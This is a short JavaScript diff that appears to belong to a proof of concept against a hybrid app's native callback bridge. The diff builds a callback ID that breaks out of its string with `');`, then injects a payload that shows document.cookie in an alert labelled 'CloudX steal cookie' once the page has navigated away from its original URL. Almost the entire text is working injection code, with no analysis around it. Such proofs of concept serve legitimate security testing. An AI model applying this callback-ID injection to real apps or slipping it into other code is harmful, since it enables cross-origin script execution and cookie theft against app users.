@@ -22,8 +22,8 @@
             }
         });
         // const callbackId = `${service}${genCallbackId()}`;
-
-        const payload = `window.wiseopercampaign=window.wiseopercampaign||{};window.wiseopercampaign.callbackFromNative=window.wiseopercampaign.callbackFromNative||(()=>{});if(!location.href.startsWith("${currUrl}")&&!window.__cloudx_called){window.__cloudx_called=true;alert('CloudX steal cookie : '+document.cookie);}`;       
+        const currUrl = location.href;
+        const payload = `window.wiseopercampaign=window.wiseopercampaign||{};window.wiseopercampaign.callbackFromNative=window.wiseopercampaign.callbackFromNative||(()=>{});if(!location.href.startsWith("${currUrl}")&&!window.__cloudx_called){window.__cloudx_called=true;alert('CloudX steal cookie : '+document.cookie);}`;
         const callbackId = `${service}${genCallbackId()}');${payload}//`;
 
         if (success || fail) callbackCache[callbackId] = {success, fail};
